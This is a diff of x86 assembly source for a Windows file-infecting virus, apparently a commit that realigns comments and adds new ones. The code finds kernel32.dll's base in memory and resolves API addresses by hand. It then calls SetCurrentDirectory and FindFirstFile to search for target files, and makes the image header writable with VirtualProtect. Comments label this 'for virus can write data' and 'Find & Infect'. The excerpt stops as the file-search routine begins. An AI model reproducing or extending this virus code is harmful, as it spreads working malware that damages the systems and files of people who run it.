@@ -35,94 +35,96 @@ delta:
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
 	mov esi,[image_base+ebp]			; point on image base
-	add eax,3ch						; At offset 3ch is the dword 'header relocation'.This value here= offset begin (PE header)  
+	add eax,3ch					; At offset 3ch is the dword 'header relocation'.This value here= offset begin (PE header)  
 	mov eax,[eax]					; get the value (PE header value)
-	add eax,esi						; +image_base (point to PE header)
-	add eax,128						; +80H (import directory RVA)
+	add eax,esi					; +image_base (point to PE header)
+	add eax,128					; +80H (import directory RVA)
 	mov eax,[eax]					; get value at this current eax
-	add eax,esi						; now point to import table (+ image_base)
-	add eax,12						; +CH (point to .dll)   
+	add eax,esi					; now point to import table (+ image_base)
+	add eax,12					; +CH (point to .dll)   
 	
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ;-----------------------------------------------Scan import---------------------------------------------------------;
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;	
 find_kernel32:
-	xor ebx,ebx						; reset ebx
+	xor ebx,ebx					; reset ebx
 	cmp dword ptr[eax],ebx				; cmp if value tai eax=0
 	je end_objecttable				; if= jmp to end_objectable
 	call is_it_kernel32				; else check if it is kernel32
-	cmp ecx,3						; check if return value=3
+	cmp ecx,3					; check if return value=3
 	jae find_kernel_image_base			; if return>=3 jmp find kernel32 image base
-	add eax,20						; else move to another .dll file
-	jmp find_kernel32					; find again
+	add eax,20					; else move to another .dll file
+	jmp find_kernel32				; find again
 	
 find_kernel_image_base:					; go to find kernel in image base
 	mov eax,[eax+4]					; point to list API address pointer
-	add eax,esi						; + image_base
+	add eax,esi					; + image_base
 	mov eax,[eax]					; now eax=address of 1st API from kernel32
 	xchg edi,eax					; swap with edi, edi=address of 1st API
 find_MZ_in_kernel:
 	dec edi						; decrease edi
-	mov esi,edi						;	 
+	mov esi,edi					;	 
 	cmp word ptr [edi],"ZM"				; check MZ
 	jne find_MZ_in_kernel				; not found then loop
 
 	mov esi,edi
-	mov esi,[esi+3CH]					; if ok, move to header relocation then get value
+	mov esi,[esi+3CH]				; if ok, move to header relocation then get value
 	cmp esi,dword  ptr 200H				; cmp if header reloc=200H
 	ja find_MZ_in_kernel				; if >200H jmp then loop
 	
-	add esi,edi						; go to new header
+	add esi,edi					; go to new header
 	cmp word ptr [esi],"EP"				; check PE
 	jne find_MZ_in_kernel				; no loop again
-	add esi,52						; point to image_base_dword
-	cmp edi,[esi]				      ; check if edi=image_base 
+	add esi,52					; point to image_base_dword
+	cmp edi,[esi]				        ; check if edi=image_base 
 	jne find_MZ_in_kernel				; loop again
 	
-	mov esi,edi						; esi=image base of kernel32.dll 
-	add esi,3CH						; mov to header relocation
+	mov esi,edi					; esi=image base of kernel32.dll 
+	add esi,3CH					; mov to header relocation
 	mov esi,[esi]					; get value
-	add esi,edi						; +image base => PE header
-	add esi,120						; move to export table
+	add esi,edi					; +image base => PE header
+	add esi,120					; move to export table
 	mov esi,[esi]					; get value
-	add esi,edi						; +image_base->esi point to the export table !!!
-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+	add esi,edi					; +image_base->esi point to the export table !!!
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ;----------------------------------------------Get Win API---------------------------------------------------------;
-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;		
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;		
 find_API:
 	push ebp
-	call find_ProcAddress						; Find address of func GetProcAddress
-	mov ebx,[esp]							; done 
+	call find_ProcAddress					; Find address of func GetProcAddress
+	mov ebx,[esp]						; done 
 	mov dword ptr [ebx+GetProcAddressAddress],ebp		; save address 
 	pop ebp
 	
 	push ebp
-	call find_GetModuleHandle
+	call find_GetModuleHandle				; Find address of func GetModuleHandle
 	mov ebx,[esp]
 	mov dword ptr [ebx+GetModuleHandleAddress],ebp
 	pop ebp
 	
-	lea eax,offset kernel_string
+	lea eax,offset kernel_string				; load kernel32.dll name
 	add eax,ebp
 	push eax
 	call [ebp+GetModuleHandleAddress]
-	mov dword ptr [ebp+handle],eax
+	mov dword ptr [ebp+handle],eax				; save module handle to mem
 	
-	call find_APIAddress						      ; now get api address 
+	call find_APIAddress					; now get api address 
 	
-	lea eax,offset path_C
+	lea eax,offset path_C					; set path to do function findfirstfile
 	add eax,ebp
 	push eax
-	call [ebp+SetCurrentDirectoryAddress]
-	call find_first_file
+	call [ebp+SetCurrentDirectoryAddress]			; call setcurrentdirectory
+	call find_first_file					; call findfirstfile
 	
 	invoke ExitProcess,0
-	push dword ptr[ebp+virtual_out] 					; make 1st 1000 byte 
-	push 80h							      	; writeable
-	push 1000h									; 1000 bytes
+	push dword ptr[ebp+virtual_out] 			; make 1st 1000 byte (for virus can write data)
+	push 80h						; writeable
+	push 1000h						; 1000 bytes
 	push dword ptr[ebp+image_base]
 	call [ebp+VirtualProtectAddress]
-	
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;---------------------------------------------Find & Infect--------------------------------------------------------;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;	
 find_first_file:
 	lea eax,[ebp+offset win32_find_data]
 	push eax
